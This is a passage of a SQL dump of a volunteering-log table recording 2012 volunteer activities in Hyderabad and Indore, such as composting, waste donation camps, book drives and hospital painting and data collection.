(134, '84', '2012-03-25', '2012-03-25', '09:00:00', '15:00:00', '6', 'Shram Daan', 'Environment', 'Organising Waste Donation camps in Gachibowli area', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(135, '114', '2012-03-18', '2012-03-18', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(136, '115', '2012-03-17', '2012-03-17', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(137, '116', '2012-03-17', '2012-03-17', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(138, '140', '2012-03-17', '2012-03-17', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(139, '82', '2012-03-17', '2012-03-17', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(140, '141', '2012-03-17', '2012-03-17', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(141, '114', '2012-03-17', '2012-03-17', '10:00:00', '16:00:00', '6', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(142, '124', '2012-03-18', '2012-03-18', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(143, '121', '2012-03-18', '2012-03-18', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(144, '129', '2012-03-18', '2012-03-18', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(145, '116', '2012-03-18', '2012-03-18', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(146, '85', '2012-03-18', '2012-03-18', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(147, '115', '2012-03-18', '2012-03-18', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(148, '82', '2012-03-18', '2012-03-18', '13:00:00', '16:00:00', '3', 'Shram Daan', 'Education', 'Oraganising Book Donation Camp In ABS', 'Onsite', 'Hyderabad', 'ABS', '', 0),
(149, '142', '2011-12-18', '2011-12-18', '09:00:00', '11:00:00', '2', 'Shram Daan', 'Environment', 'Awareness Campaign for Households on waste segregation at Limbodhi', 'Onsite', 'Indore', '', '', 7),
(150, '143', '2011-12-11', '2011-12-11', '08:00:00', '14:00:00', '6', 'Shram Daan', 'Environment', 'Awareness Campaign for Households on waste segregation at Kalindi Kunj', 'Onsite', 'Indore', '', '', 7),
(151, '144', '2011-12-18', '2011-12-18', '09:00:00', '12:00:00', '3', 'Shram Daan', 'Environment', 'Awareness Campaign for Households on waste segregation at Limbodhi', 'Onsite', 'Indore', '', '', 7),
(152, '145', '2011-12-18', '2011-12-18', '09:00:00', '14:00:00', '6', 'Shram Daan', 'Environment', 'Awareness Campaign for Households on waste segregation at Limbodhi', 'Onsite', 'Indore', '', '', 7),
(153, '146', '2012-01-20', '2012-01-21', '09:00:00', '08:00:00', '11', 'Shram Daan', 'Environment', 'Distribution of compost at exhibition ', 'Onsite', 'Indore', '', '', 7),
(154, '121', '2012-05-02', '2012-05-02', '12:30:00', '15:20:00', '3', 'Shram daan', 'Health ', 'Went on to various departments to collect data', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(155, '121', '2012-05-02', '2012-05-02', '16:10:00', '18:20:00', '2', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(156, '121', '2012-05-03', '2012-05-03', '09:00:00', '15:20:00', '6', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(157, '121', '2012-05-03', '2012-05-03', '20:00:00', '21:00:00', '1', 'Gyan daan', 'Health ', 'Digitizing the data of overall statistics of Gandhi hospital from year 2005-2011', 'Offsite', 'Hyderabad', 'ABS', '', 12),
(158, '121', '2012-05-04', '2012-05-04', '09:00:00', '14:10:00', '5', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(159, '121', '2012-05-04', '2012-05-04', '14:35:00', '16:30:00', '2', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(160, '121', '2012-05-04', '2012-05-04', '16:40:00', '17:10:00', '1', 'Gyan daan', 'Health ', 'Digitizing the collected data into excel at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(161, '121', '2012-05-05', '2012-05-05', '09:00:00', '10:20:00', '1', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(162, '121', '2012-05-05', '2012-05-05', '10:30:00', '11:20:00', '1', 'Shram daan', 'Health ', 'Painting the corridors at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(163, '121', '2012-05-05', '2012-05-05', '11:45:00', '14:10:00', '2', 'Shram daan', 'Health ', 'Went on to various departments to collect data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(164, '121', '2012-05-05', '2012-05-05', '14:20:00', '18:00:00', '4', 'Shram daan', 'Health ', 'Painting the corridors at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(165, '121', '2012-05-05', '2012-05-05', '19:00:00', '21:00:00', '2', 'Gyan daan', 'Health ', 'Digitizing the collected data into excel at gandhi hospital', 'Offsite', 'Hyderabad', 'ABS', '', 12),
(166, '121', '2012-05-07', '2012-05-07', '09:10:00', '14:40:00', '5', 'Shram daan', 'Health ', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(167, '121', '2012-05-07', '2012-05-07', '15:20:00', '17:10:00', '2', 'Gyan daan', 'Health ', 'Digitizing the collected data into excel at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(168, '121', '2012-05-07', '2012-05-07', '18:20:00', '20:55:00', '2', 'Gyan daan', 'Health ', 'Preparation of report on painting work at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(169, '121', '2012-05-08', '2012-05-08', '09:00:00', '14:10:00', '5', 'Shram daan', 'Health ', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(170, '121', '2012-05-08', '2012-05-08', '15:00:00', '17:15:00', '2', 'Gyan daan', 'Health ', 'Preparation of report on painting work at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(171, '124', '2012-05-02', '2012-05-02', '12:30:00', '15:20:00', '3', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(172, '124', '2012-05-02', '2012-05-02', '16:10:00', '18:20:00', '2', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(173, '124', '2012-05-03', '2012-05-03', '09:00:00', '15:20:00', '6', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(174, '124', '2012-05-03', '2012-05-03', '20:15:00', '22:00:00', '1', 'Gyan daan', 'Health', 'Digitizing the data of overall statistics of Gandhi hospital from year 2005-2011', 'Offsite', 'Hyderabad', 'ABS', '', 12),
(175, '124', '2012-05-04', '2012-05-04', '09:00:00', '14:10:00', '5', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(176, '124', '2012-05-04', '2012-05-04', '14:35:00', '16:30:00', '2', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(177, '124', '2012-05-04', '2012-05-04', '16:40:00', '17:10:00', '1', 'Gyan daan', 'Health', 'Digitizing the collected data into excel at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(178, '124', '2012-05-05', '2012-05-05', '09:00:00', '10:20:00', '1', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(179, '124', '2012-05-05', '2012-05-05', '10:30:00', '11:20:00', '1', 'Shram daan', 'Health', 'Painting the corridors at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(180, '124', '2012-05-05', '2012-05-05', '11:45:00', '14:10:00', '2', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(181, '124', '2012-05-05', '2012-05-05', '14:20:00', '18:00:00', '4', 'Shram daan', 'Health', 'Painting the corridors at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(182, '124', '2012-05-05', '2012-05-05', '20:30:00', '22:10:00', '1', 'Gyan daan', 'Health', 'Digitizing the collected data into excel at gandhi hospital', 'Offsite', 'Hyderabad', 'ABS', '', 12),
(183, '124', '2012-05-07', '2012-05-07', '09:10:00', '14:40:00', '4', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(184, '124', '2012-05-07', '2012-05-07', '15:20:00', '17:10:00', '2', 'Gyan daan', 'Health', 'Digitizing the collected data into excel at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(185, '124', '2012-05-07', '2012-05-07', '18:20:00', '20:55:00', '2', 'Gyan daan', 'Health', 'Preparation of report on painting work at Gandhi Hospital ', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(186, '124', '2012-05-08', '2012-05-08', '09:00:00', '14:10:00', '5', 'Shram daan', 'Health', 'went on to various departments to collect biomedical equipment data at gandhi hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(187, '124', '2012-05-08', '2012-05-08', '15:00:00', '17:15:00', '2', 'Gyan daan', 'Health', 'Preparation of report on painting work at Gandhi Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(188, '84', '2012-04-17', '2012-04-17', '14:30:00', '15:30:00', '1', 'Shram Daan', 'Environment', 'Field survey of items needed for composting site. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(189, '84', '2012-04-17', '2012-04-17', '18:00:00', '19:00:00', '1', 'Shram Daan', 'Environment', 'Field work. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(190, '84', '2012-04-18', '2012-04-18', '10:30:00', '13:00:00', '2', 'Shram Daan', 'Environment', 'Input of items needed for composting in Excel(financials). ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(191, '84', '2012-04-20', '2012-04-20', '17:30:00', '19:30:00', '2', 'Shram Daan', 'Environment', 'Administrative work and  survey on status stand for  HMDA compost site.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(192, '84', '2012-04-21', '2012-04-21', '11:30:00', '13:00:00', '1', 'Shram Daan', 'Environment', 'Regular weekly visit at HMDA lumbini park site for checking how the composting taking place.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(193, '84', '2012-04-23', '2012-04-23', '09:00:00', '10:00:00', '1', 'Shram Daan', 'Environment', 'field work at Lumbini Park compost site. At the site we installed 50% of the compost bed. the compost bed is of bamboo pools and metal sheets,its Lenght is 8 feet and width is 3 feet.                             ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(194, '84', '2012-04-23', '2012-04-23', '18:00:00', '19:00:00', '1', 'Shram Daan', 'Environment', 'Educating people about the daily generated waste.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(195, '84', '2012-04-24', '2012-04-24', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', ' Installing compost bed at HMDA site with bamboos and metal sheet.                                  ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(196, '84', '2012-04-24', '2012-04-24', '14:00:00', '16:00:00', '2', 'Shram Daan', 'Environment', 'Contacting diferent printers persons for making pamplate for distribution at gachibowli school compost site.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(197, '84', '2012-04-25', '2012-04-25', '14:30:00', '15:15:00', '1', 'Shram Daan', 'Environment', 'Examine the gachibowli school site compost .                                       ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(198, '84', '2012-04-25', '2012-04-25', '15:30:00', '18:30:00', '2', 'Shram Daan', 'Environment', 'Survey of items needed for composte for hillridge site composting. finalising Compost flyers .', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(199, '84', '2012-04-26', '2012-04-26', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Planning compost bed at Hillridge and Installing Compost bed ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(200, '84', '2012-04-26', '2012-04-26', '11:15:00', '05:00:00', '5', 'Shram Daan', 'Environment', 'Supervising garden team at Hill Ridge Springs. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(201, '84', '2012-04-26', '2012-04-26', '05:30:00', '07:30:00', '2', 'Shram Daan', 'Environment', 'Setting up a compost bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(202, '84', '2012-04-27', '2012-04-27', '11:30:00', '18:00:00', '6', 'Shram Daan', 'Environment', 'Instaling 2nd compost bed at Hillridge gachibowli.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(203, '84', '2012-04-28', '2012-04-28', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', 'setting up a waste donation camp at padmarao nagar. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(204, '84', '2012-04-28', '2012-04-28', '12:30:00', '13:17:00', '1', 'Shram Daan', 'Environment', 'Selling the dry waste, collected to the Rahdi wala. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(205, '84', '2012-04-29', '2012-04-29', '12:30:00', '14:30:00', '2', 'Shram Daan', 'Environment', 'coordinating with the radhi wala.                                              ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(206, '84', '2012-04-29', '2012-04-29', '15:30:00', '16:00:00', '1', 'Shram Daan', 'Environment', 'Selling the waste to the radhi wala.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(207, '84', '2012-04-29', '2012-04-29', '16:30:00', '18:00:00', '1', 'Shram Daan', 'Environment', 'Setting up a camp. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(208, '84', '2012-04-30', '2012-04-30', '12:30:00', '14:00:00', '1', 'Shram Daan', 'Environment', 'Completing the compost Bed at  HMDA .                                      ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(209, '84', '2012-05-01', '2012-05-01', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Updating volunteer database                                       ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(210, '84', '2012-05-03', '2012-05-03', '11:30:00', '13:30:00', '2', 'Shram Daan', 'Environment', 'collecting the donation amount from Invesco, Radhi wala.                                              ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(211, '84', '2012-05-03', '2012-05-03', '14:00:00', '15:00:00', '1', 'Shram Daan', 'Environment', 'Checking the compost sites at Gachibowli                                                ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(212, '84', '2012-05-04', '2012-05-04', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Environment', ' Checking and updating the compost bed at HMDA site.            ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(213, '84', '2012-05-05', '2012-05-05', '09:30:00', '12:00:00', '2', 'Shram Daan', 'Health', 'Helpng Gandhi hospital(Sec-bad) in Paintig,at pharmasetical depart.', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(214, '84', '2012-05-05', '2012-05-05', '13:00:00', '18:00:00', '4', 'Shram Daan', 'Environment', 'Improving the maintainence', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(215, '84', '2012-05-08', '2012-05-08', '11:30:00', '13:00:00', '1', 'Shram Daan', 'Environment', 'Updating the volunteer data base as on 5-May-2012 (Painting work at Gandhi)    ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(216, '84', '2012-05-08', '2012-05-08', '14:00:00', '18:00:00', '3', 'Shram Daan', 'Environment', 'Updating the volunteer database', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(217, '84', '2012-05-09', '2012-05-09', '09:30:00', '22:30:00', '1', 'Shram Daan', 'Environment', 'Weekly check on C-Beds status at HMDA.                                       ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(218, '84', '2012-05-09', '2012-05-09', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'May month Volunteer track list.                                                  ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(219, '84', '2012-05-12', '2012-05-12', '09:30:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Meeting Mr. Abhijeet         ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(220, '84', '2012-05-12', '2012-05-12', '12:30:00', '15:30:00', '3', 'Shram Daan', 'Environment', ' Meeting Mr. Hari Mohan and cleaning team head', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(221, '84', '2012-05-12', '2012-05-12', '15:30:00', '19:00:00', '5', 'Shram Daan', 'Environment', 'Training the garden team at HMDA', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(222, '84', '2012-05-13', '2012-05-13', '09:30:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Vsit the Gachibowli Area C Garden Place', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(223, '84', '2012-05-14', '2012-05-14', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Meeting with Dr. Aabhijeet regarding composting in Hospital', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(224, '84', '2012-05-14', '2012-05-14', '13:00:00', '15:00:00', '2', 'Shram Daan', 'Environment', 'Visit the compost Place  alloted by Gandhi Hospital Management Authority', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(225, '84', '2012-05-15', '2012-05-15', '11:00:00', '13:00:00', '2', 'Shram Daan', 'Environment', 'Give the C- Garden traning session to HMDA office Garden team', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(226, '84', '2012-05-16', '2012-05-16', '11:00:00', '16:00:00', '5', 'Shram Daan', 'Environment', 'Went to ca and Invesco office to collect waste donation', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(227, '84', '2012-05-17', '2012-05-17', '12:00:00', '17:00:00', '5', 'Shram Daan', 'Environment', 'Went to ca and Invesco office to collect waste donation', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(228, '84', '2012-05-18', '2012-05-18', '11:00:00', '12:00:00', '1', 'Shram Daan', 'Environment', 'Work on some data in office', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(229, '84', '2012-05-19', '2012-05-19', '10:00:00', '13:00:00', '3', 'Shram Daan', 'Environment', 'Went to Ranigunj to buy compost beds material.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(230, '84', '2012-05-19', '2012-05-19', '14:00:00', '17:00:00', '3', 'Shram Daan', 'Environment', 'Set up compost beds in NTR Garedn', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(231, '84', '2012-05-20', '2012-05-20', '11:00:00', '16:00:00', '5', 'Shram Daan', 'Environment', 'Set up compost beds in NTR Garedn', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(232, '84', '2012-05-20', '2012-05-20', '10:00:00', '11:00:00', '1', 'Shram Daan', 'Environment', 'Work on Some data', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(233, '84', '2012-05-21', '2012-05-21', '11:30:00', '13:30:00', '2', 'Shram Daan', 'Environment', 'Set up compost beds in HMDA office', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(234, '120', '2012-04-17', '2012-04-17', '14:30:00', '16:00:00', '1', 'Shram daan', 'Environment', 'Field survey of items needed for composting site. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(235, '120', '2012-04-18', '2012-04-18', '09:00:00', '10:30:00', '1', 'Shram daan', 'Environment', 'Field survey of items needed for composting  at HMDA site.                                             ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(236, '120', '2012-04-18', '2012-04-18', '10:30:00', '13:00:00', '2', 'Shram daan', 'Environment', 'Input of items needed for composting in Excel(financials). ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(237, '120', '2012-04-19', '2012-04-19', '14:00:00', '18:00:00', '4', 'Shram daan', 'Environment', 'Survey of compost and needed for composting site, at panjagutta area.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(238, '120', '2012-04-21', '2012-04-21', '11:30:00', '13:00:00', '1', 'Shram daan', 'Environment', 'Regular weekly visit at HMDA lumbini park site for checking how the composting taking place.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(239, '120', '2012-04-23', '2012-04-23', '09:00:00', '10:00:00', '1', 'Shram daan', 'Environment', 'field work at Lumbini Park compost site.                        ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(240, '120', '2012-04-24', '2012-04-24', '10:00:00', '11:00:00', '1', 'Shram daan', 'Environment', ' Installing compost bed at HMDA site with bamboos and metal sheet.                                  ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(241, '120', '2012-04-24', '2012-04-24', '12:30:00', '13:30:00', '1', 'Shram daan', 'Environment', 'Telephone Survey and buying items for composting and tomorrows meeting at gachibowli school', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(242, '120', '2012-04-24', '2012-04-24', '14:00:00', '16:00:00', '2', 'Shram daan', 'Environment', 'Contacting different printers persons for making pamplate for distribution at gachibowli school compost site.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(243, '120', '2012-04-25', '2012-04-25', '15:30:00', '18:30:00', '2', 'Shram daan', 'Environment', 'Survey of items needed for composte for hillridge site composting. finalising Compost flyers .', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(244, '120', '2012-04-28', '2012-04-28', '09:30:00', '12:00:00', '2', 'Shram daan', 'Environment', 'setting up a waste donation camp at padmarao nagar. ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(245, '120', '2012-04-29', '2012-04-29', '09:00:00', '12:00:00', '3', 'Shram daan', 'Environment', 'setting up a Waste donation camp at Gachibowli,Trends set towers.                                           ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(246, '120', '2012-04-29', '2012-04-29', '12:30:00', '14:30:00', '2', 'Shram daan', 'Environment', 'coordinating with the radhi wala.                                              ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(247, '120', '2012-04-30', '2012-04-30', '12:30:00', '14:00:00', '1', 'Shram daan', 'Environment', 'Completing the compost Bed at  HMDA .                                      ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(248, '120', '2012-04-30', '2012-04-30', '14:15:00', '18:00:00', '3', 'Gyaan daan', 'Environment', 'Preparing a presentation on how to make a compost bed.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(249, '120', '2012-05-03', '2012-05-03', '09:30:00', '11:00:00', '1', 'Gyaan daan', 'Environment', ' Updating the YouSee website about Waste donation camp amount as of 29-Apr-2012.                                 ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(250, '120', '2012-05-03', '2012-05-03', '11:30:00', '13:30:00', '2', 'Shram daan', 'Environment', 'Collecting the donation amount from Invesco, Radhi wala.                                              ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(251, '120', '2012-05-03', '2012-05-03', '14:00:00', '15:00:00', '1', 'Shram daan', 'Environment', 'Checking the compost sites at  hillridge springs', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(252, '120', '2012-05-04', '2012-05-04', '09:30:00', '12:00:00', '2', 'Shram daan', 'Environment', ' Checking and updating the compost bed at HMDA site.            ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(253, '120', '2012-05-05', '2012-05-05', '09:30:00', '12:00:00', '2', 'Shram daan', 'Health', 'Helpng Gandhi hospital(Sec-bad) in Paintig,at pharmasetical depart.', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(254, '120', '2012-05-07', '2012-05-07', '09:30:00', '14:30:00', '5', 'Gyaan daan', 'Environment', 'Preparing a YouSee result certificate for Hill Ridge Springs.                                         ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(255, '120', '2012-05-08', '2012-05-08', '11:30:00', '13:00:00', '1', 'Gyaan daan', 'Health', 'Updating the volunteer data base as on 5-May-2012 (Painting work at Gandhi)    ', 'Onsite', 'Hyderabad', 'ABS', '', 12),
(256, '120', '2012-05-09', '2012-05-09', '09:30:00', '22:30:00', '1', 'Shram daan', 'Environment', 'Weekly check on C-Beds status at HMDA.                                       ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(257, '120', '2012-05-09', '2012-05-09', '11:00:00', '12:00:00', '1', 'Gyaan daan', 'Environment', 'May month Volunteer track list.                                                  ', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(258, '120', '2012-05-09', '2012-05-09', '12:15:00', '13:00:00', '1', 'Gyaan daan', 'Environment', 'Final Presentation on composting.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(259, '120', '2012-05-10', '2012-05-10', '12:00:00', '13:00:00', '1', 'Gyaan daan', 'Environment', 'Preparing the inturn logg sheet.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(260, '120', '2012-05-12', '2012-05-12', '11:00:00', '12:00:00', '1', 'Shram daan', 'Environment', 'Training the garden team at HMDA.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(261, '120', '2012-05-12', '2012-05-12', '13:00:00', '04:00:00', '3', 'Gyaan daan', 'Environment', 'Meeting at YouSee office on making a plan for next week Activities.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(262, '120', '2012-05-12', '2012-05-12', '17:00:00', '18:00:00', '1', 'Shram daan', 'Environment', 'Training the garden team. planning for the activities for a week.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(263, '120', '2012-05-13', '2012-05-13', '10:00:00', '11:00:00', '1', 'Shram daan', 'Environment', 'Weekly visit, meeting at Hill Ridge gachibowli.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(264, '120', '2012-05-14', '2012-05-14', '13:15:00', '14:30:00', '1', 'Shram daan', 'Environment', 'Preparing a poster for Invesco dry waste camp.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(265, '120', '2012-05-14', '2012-05-14', '15:00:00', '18:00:00', '2', 'Gyaan daan', 'Environment', 'Survey of the Items needed for composting.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(266, '120', '2012-05-14', '2012-05-14', '18:00:00', '19:00:00', '1', 'Shram daan', 'Environment', 'Making a poster for Invesco', 'Onsite', 'Hyderabad', 'ABS', '', 7);
INSERT INTO `volunteering` (`volunteer_act_id`, `donor_id`, `from_date`, `to_date`, `from_time`, `to_time`, `hours`, `donation_type`, `area`, `activity_done`, `onsite_offsite`, `location`, `organisation`, `notes`, `project_id`) VALUES
(267, '120', '2012-05-15', '2012-05-15', '12:15:00', '13:00:00', '2', 'Gyaan daan', 'Environment', 'Explaining HMDA garden team about the composting, how they should take care of it.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(268, '120', '2012-05-15', '2012-05-15', '13:00:00', '14:00:00', '1', 'Gyaan daan', 'Environment', 'Preparing a dry waste camp poster for Invesco .', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(269, '120', '2012-05-15', '2012-05-15', '15:00:00', '16:00:00', '2', 'Shram daan', 'Environment', 'Preparing a dry waste camp poster for Invesco .', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(270, '120', '2012-05-16', '2012-05-16', '11:00:00', '12:00:00', '1', 'Shram daan', 'Environment', 'Arrangements for the waste donation camp at INVESCO(Gachibowli).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(271, '120', '2012-05-16', '2012-05-16', '12:00:00', '14:00:00', '2', 'Shram daan', 'Environment', 'Waste donation Camp at ca technologies(Gachibowli).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(272, '120', '2012-05-16', '2012-05-16', '03:00:00', '05:00:00', '2', 'Shram daan', 'Environment', 'Setting up a waste donation camp at ca technologies(Gachibowli).', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(273, '120', '2012-05-17', '2012-05-17', '10:00:00', '12:00:00', '2', 'Shram daan', 'Environment', 'Weekly checking and traning the HMDA compost centre workers.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
(274, '120', '2012-05-17', '2012-05-17', '12:00:00', '14:00:00', '2', 'Shram daan', 'Environment', 'Collecting the dry waste from ca technologies and selling it to Radiwala.', 'Onsite', 'Hyderabad', 'ABS', '', 7),
